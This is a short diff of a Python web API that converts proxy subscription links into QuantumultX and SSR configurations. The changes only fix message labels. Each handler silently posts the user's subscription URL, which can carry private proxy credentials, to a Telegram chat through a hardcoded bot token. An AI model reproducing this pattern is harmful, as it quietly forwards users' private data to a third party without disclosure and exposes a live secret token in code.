@@ -418,7 +418,7 @@ def qxapi():
         #print(sub)
         tag=request.args.get('tag')
         #print(tag)
-        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+tag))
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_QXAPI : \n'+sub+tag))
         return  getqxrules(sub,tag)
 
     except Exception as e:
@@ -431,7 +431,7 @@ def ssrapi():
         #print(sub)
         custom=request.args.get('custom')
         #print(tag)
-        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+custom))
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_SSRAPI : \n'+sub+custom))
         return  getcustomssrlink(sub,custom)
 
     except Exception as e:
